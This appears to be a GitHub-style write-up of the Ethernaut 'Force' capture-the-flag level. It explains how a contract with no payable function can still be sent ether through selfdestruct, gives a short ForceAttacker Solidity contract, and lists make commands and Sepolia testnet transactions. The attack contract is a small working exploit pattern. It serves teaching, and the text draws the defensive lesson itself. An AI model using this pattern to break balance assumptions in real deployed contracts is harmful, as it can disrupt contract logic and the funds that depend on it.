# Level 7: Force

**Level Page**: [See on Ethernaut](https://ethernaut.openzeppelin.com/level/0xb6c2Ec883DaAac76D8922519E63f875c2ec65575)

**Description**:

Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

Fallback methods
Sometimes the best way to attack a contract is with another contract.

`Text after completing the level`:

In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

**Code**

Code to be exploited:

<details>
<summary>See Code</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ 
}
```

</details>

# Findings

This level was only to show that even if the contract doesn't have a `fallback` or `receive` function it can still receive ethers if another contract self destructs, therefore, forcing all ether balance to another contract. And this feature can be used to attack another contract.

# Attack

**Description**: To explore the use of `selfdestruct` function, I created another contract `ForceAttacker` that uses this function to force sending ether to the `Force` contract. This is part of the `ForceAttacker.sol` code:

```javascript
contract ForceAttacker {
  address force;

  constructor(address _force) {
    force = _force;
  }

  function attack() external payable{
    selfdestruct(payable(force));
  }
}
```

So the order to attack the `Force` contract is:

1. Deploy the `ForceAttacker` with `make deploy`
2. Attack the `Force` contract with `make attack` (remember to paste the `ForceAttacker` address to `ATTACKER_CONTRACT` in the `.env` file)
3. Submit the level `make submit`

**Instance used**: [0x3c504f9f7F610c7b320Fef589b52062daF6aa527](https://sepolia.etherscan.io/address/0x3c504f9f7F610c7b320Fef589b52062daF6aa527)

**Attacker Contract**: [0x39EF55DA2FC1C261a9742406a82748023A60b394](https://sepolia.etherscan.io/address/0x39EF55DA2FC1C261a9742406a82748023A60b394)

**Attack Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0x1e0e4d5724f60b78eec4eb6ec65ffd30274c0f8e0c5490148b1758e2d8e4bb14)

**Level Completed Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0xc1432784a528db913232053f18dd809528a7b74e785dafddca63efed21200d2f)

# Getting started

## Build

```bash
make build
```

## Test

```bash
make test
```

## Deploy attacker contract (testnet)

```bash
make deploy
```

## Attack (testnet)

```bash
make attack
```

## Submit level (testnet)

```bash
make submit
```

## Check if you completed the level (testnet)

`true` - You completed the level
`false` - You didn't complete the level

```bash
make check
```